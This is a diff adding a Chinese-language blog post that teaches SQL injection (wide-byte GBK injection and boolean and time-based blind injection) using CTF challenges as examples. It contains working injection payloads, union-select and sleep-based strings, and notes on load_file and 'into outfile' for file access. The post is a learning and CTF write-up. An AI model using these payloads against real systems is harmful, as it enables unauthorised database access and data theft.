@@ -300,6 +300,297 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/22/SQLInjectionAttack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="hwhehr">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/images.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hwhehr">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/22/SQLInjectionAttack/" itemprop="url">SQLInjectionAttack</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-22T17:55:18+08:00">
+                2018-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="一、SQL注入"><a href="#一、SQL注入" class="headerlink" title="一、SQL注入"></a>一、SQL注入</h1><ul>
+<li><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5></li>
+</ul>
+<p>&emsp;&emsp;宽字节注入原理：</p>
+<p>&emsp;&emsp;<strong><code>GBK</code> 占用两字节，<code>ASCII</code>占用一字节。PHP中编码为<code>GBK</code>，函数执行添加的是<code>ASCII编码</code>，MYSQL默认字符集是<code>GBK</code>等宽字节字符集。</strong></p>
+<p>&emsp;&emsp;在客户端输入字符<code>&#39;</code>被PHP转义成<code>\&#39;</code>，<code>\&#39;</code>编码是<code>%5c%27</code>。</p>
+<p>&emsp;&emsp;如果注入的时候在<code>&#39;</code>前面加上<code>%df</code>字符变成<code>%df&#39;</code>，经过转义之后变成<code>%df%5c%27</code>，而之前说了MYSQL默认的是<code>GBK</code>等宽字节字符集，<code>GBK</code>编码格式会把本来属于<code>ascii</code>编码的字符‘吃掉’，会将<code>%df%5c</code>编码成<code>運</code>，所以会将<code>%df%5c%27</code>编码成<code>運&#39;</code>。</p>
+<p>&emsp;&emsp;于是就可以继续愉快的注入了。</p>
+<p>&emsp;&emsp;<strong>==注：==</strong> </p>
+<p>&emsp;&emsp;&emsp;&emsp;==1.宽字节注入与HTML页面编码是无关的，在<code>&lt;meta charset=utf8&gt;</code>情况下一样有可能进行宽字节注入。==</p>
+<p>&emsp;&emsp;&emsp;&emsp;==2.宽字节注入不一定只有<code>GBK</code>编码，宽字节编码都有可能可以进行宽字节注入。==</p>
+<p>&emsp;&emsp;<strong>例：</strong></p>
+<p>&emsp;&emsp;BugkuCTF–sql注入:<a href="http://103.238.227.13:10083/" target="_blank" rel="noopener">http://103.238.227.13:10083/</a></p>
+<p>&emsp;&emsp;使用<code>&#39;</code>没有反应，于是猜测是宽字节注入。</p>
+<p>&emsp;&emsp;这道题里面还有一个知识点（keng）就是<code>key</code>是MYSQL的关键字，直接使用会报错。MYSQL提供了一个转义符号 &#96; 来区别关键词和库表字段名。</p>
+<pre><code>id=1%df%27%20union%20select%200,string%20from%20`key`%23
+id=1%df&apos; union select 0,string from `key`#
+</code></pre><hr>
+<ul>
+<li><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4></li>
+</ul>
+<p>&emsp;&emsp;盲注应用于存在SQL注入漏洞，但是页面没有显示报错信息，或者网站过滤了部分特定字段，如<code>union</code>。盲注可以通过页面返回信息的正确与否判断语句是否正确。</p>
+<p>&emsp;&emsp;盲注分为两种：布尔和延时盲注。</p>
+<p>&emsp;&emsp;常用函数：</p>
+<pre><code>Length()        返回字符串的长度
+limit num,num   限制返回数据条数
+Substr()        截取字符串
+Ascii()         返回字符的ascii码
+sleep(n)        将程序挂起一段时间 n为n秒
+if(expr1,expr2,expr3)
+                判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
+</code></pre><p>&emsp;&emsp;构造语句：</p>
+<pre><code>## 布尔盲注：
+AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; &apos;A&apos; ## 表名
+AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; &apos;A&apos; ## 列名
+
+1&apos; and (ascii(substr(database(),1,1)))=115 --+
+1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100 --+
+
+## 延时盲注：
+1&apos; and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null))  --+ 
+</code></pre><p>&emsp;&emsp;<strong>例：</strong></p>
+<p>&emsp;&emsp;DDCTF-2018–数据库的秘密：<a href="http://116.85.43.88:8080/ZVDHKBUVUZSTJCNX/dfe3ia/index.php" target="_blank" rel="noopener">http://116.85.43.88:8080/ZVDHKBUVUZSTJCNX/dfe3ia/index.php</a></p>
+<p>&emsp;&emsp;<a href="https://hwhehr.github.io/2018/04/21/DDCTF-2018/" target="_blank" rel="noopener">数据库的秘密</a></p>
+<hr>
+<p>未完待续。。。</p>
+<hr>
+<ul>
+<li>布尔注入</li>
+<li>联合查询注入</li>
+<li>时间延时注入</li>
+<li>报错注入</li>
+<li>多语句注入</li>
+</ul>
+<hr>
+<h5 id="SQL注入资料"><a href="#SQL注入资料" class="headerlink" title="SQL注入资料"></a>SQL注入资料</h5><table>
+<thead>
+<tr>
+<th>常见参数</th>
+<th>用途      </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>user()</td>
+<td>当前数据库用户名</td>
+</tr>
+<tr>
+<td>database()</td>
+<td>当前数据库名</td>
+</tr>
+<tr>
+<td>version()</td>
+<td>当前使用数据库版本</td>
+</tr>
+<tr>
+<td>@@datadir</td>
+<td>数据库储存路径</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>常用函数</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ascii(str)</td>
+<td>将字符转换为ascii</td>
+</tr>
+<tr>
+<td>char(num)</td>
+<td>将数字转换为字符</td>
+</tr>
+<tr>
+<td>substr(str,num,num)</td>
+<td>切割字符串</td>
+</tr>
+<tr>
+<td>limit num,num</td>
+<td>限制输出查询条数</td>
+</tr>
+<tr>
+<td>concat(str,str…)</td>
+<td>联合数据，用于联合两条数据</td>
+</tr>
+<tr>
+<td>sleep(num)</td>
+<td>延时</td>
+</tr>
+<tr>
+<td>count(*)</td>
+<td>返回数据条数</td>
+</tr>
+<tr>
+<td>group_concat()</td>
+<td>与concat()类似</td>
+</tr>
+<tr>
+<td>concat_ws()</td>
+<td>与concat()类似</td>
+</tr>
+<tr>
+<td>hex() / unhex()</td>
+<td>用于hex编码解码</td>
+</tr>
+<tr>
+<td>load_file()</td>
+<td>以文本方式读取文件</td>
+</tr>
+<tr>
+<td>select xxoo into outfile path</td>
+<td>权限高时可直接写文件</td>
+</tr>
+</tbody>
+</table>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/21/DDCTF-2018/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -652,7 +943,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -663,7 +954,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
